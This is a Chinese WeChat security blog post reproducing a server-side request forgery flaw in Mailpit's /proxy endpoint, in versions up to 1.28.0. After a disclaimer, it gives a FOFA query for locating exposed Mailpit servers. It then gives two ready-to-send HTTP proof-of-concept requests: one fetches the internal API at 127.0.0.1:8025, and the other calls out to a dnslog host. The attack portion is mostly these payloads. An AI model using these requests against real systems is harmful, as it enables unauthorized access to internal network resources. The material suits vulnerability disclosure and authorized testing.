---
title: 漏洞复现 || Mailpit服务端请求伪造
url: https://mp.weixin.qq.com/s/vgRuAGD7ZCehLka6qOevAw
source: Doonsec's feed
date: 2026-01-22
fetch_date: 2026-01-23T03:30:09.392662
---

# 漏洞复现 || Mailpit服务端请求伪造

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VG54H1YdJxgtU42feEOr2AuDB6icOPgMIRpSsykJgI4VSqVqZVmjkf7g/0?wx_fmt=jpeg)

# 漏洞复现 || Mailpit服务端请求伪造

韩文庚
韩文庚

我爱林

![]()

在小说阅读器中沉浸阅读

## 免责声明

**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**

## 漏洞描述

      Mailpit是一款电子邮件测试工具，Mailpit在1.28.0及之前版存有漏洞，该漏洞源于/proxy端点服务端请求伪造，允许攻击者未授权访问内部网络资源。

![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VAINiaraKuQ8a3zXRH94AeSia1D52ZUZo1EP3ic3YXIiczMUGf7NVgpNlEg/640?wx_fmt=png&from=appmsg)

## 资产确定

```
fofa： "Mailpit"
```

## 漏洞复现

1.利用如下POC执行得到回显

```
GET /proxy?url=http://127.0.0.1:8025/api/v1/info HTTP/1.1Host: {{hostname}}Cache-Control: max-age=0Accept-Language: en-US,en;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-alive
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1V6B8HCsHxbNJ4yYIfpjFwSMiaWPlbO6CCWZmDLO8mKSaRt2iaQtYic1Akg/640?wx_fmt=png&from=appmsg)

2.利用如下POC执行Dnslog外带得到请求

```
GET /proxy?url=http://[dnslog地址] HTTP/1.1Host: {{hostname}}Cache-Control: max-age=0Accept-Language: en-US,en;q=0.9Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brConnection: keep-alive
```

![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VIJVvaeBia2qTWm0BSqAT9Y1q5hDE0NElc5t0sdtBIsIDdG8gAxTKcHA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VwMAZRLrKBXJj0VZicicptcwnzX9gFq7v2tVfJel1HZ2EFqFQGPpISgiag/640?wx_fmt=png&from=appmsg)

如有侵权，请联系删除

感谢您抽出

![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2)

.

![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3)

.

![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4)

来阅读本文

![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5)

**点它，分享点赞在看都在这里**

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOp2jpiaecXmDsTJB0jLIssgicXXLR2TOiaNc7PC5GiasRxmoMO5HbIRKg5ESe27wibNciciaymDZU1mt6TQ/0?wx_fmt=png)

我爱林

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOp2jpiaecXmDsTJB0jLIssgicXXLR2TOiaNc7PC5GiasRxmoMO5HbIRKg5ESe27wibNciciaymDZU1mt6TQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过